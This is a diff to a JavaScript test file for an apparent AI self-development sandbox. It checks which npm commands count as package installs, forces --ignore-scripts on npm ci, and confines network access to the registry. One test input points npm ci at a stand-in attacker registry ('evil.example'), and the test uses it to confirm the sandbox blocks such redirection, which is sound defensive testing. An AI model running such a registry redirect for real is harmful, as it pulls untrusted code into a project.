@@ -18,7 +18,7 @@ import { createBranch, savePolicy, setLockdown } from "../dist/index.js";
 import { ContractBook, contractGuard, pushRefusal, selfDevelopmentLine, sourceSendHold } from "../dist/self-development-contract.js";
 import { PrepareSourceChangeSchema } from "../dist/self-development.js";
 import { betaLine } from "../dist/desktop/dev-build.js";
-import { confinedWall, installsPackages, npmRegistryHost } from "../dist/integrations/shell.js";
+import { confinedWall, heldCommand, installsPackages, npmRegistryHost } from "../dist/integrations/shell.js";
 import { SandboxProxy } from "../dist/sandbox-proxy.js";
 import { createServer } from "node:http";
 import { connect } from "node:net";
@@ -119,6 +119,8 @@ test("selfdev: npm ci in the self-development copy reaches the npm registry and 
   assert.equal(installsPackages({ path: "/usr/bin/npm", args: [] }, ["ci", "--registry=https://evil.example"]), true, "the door, not the words, decides where it goes");
   for (const [executable, args] of [[npm, ["publish"]], [npm, ["install", "x"]], [{ path: "/usr/bin/node", args: [] }, ["ci"]], [npm, ["run", "ci"]]])
     assert.equal(installsPackages(executable, args), false, `${executable.path} ${args.join(" ")}`);
+  assert.deepEqual(heldCommand(npm, ["ci"]), { args: ["ci", "--ignore-scripts"], registry: true }, "only npm itself has the registry: no package's scripts run");
+  assert.deepEqual(heldCommand(npm, ["run", "build"]), { args: ["run", "build"], registry: false });
   const wall = confinedWall(open, { registry: true });
   assert.equal(wall.network, "per-site");
   assert.deepEqual(wall.keySites, {}, "a saved key is never swapped in, so the registry cannot be signed in to");
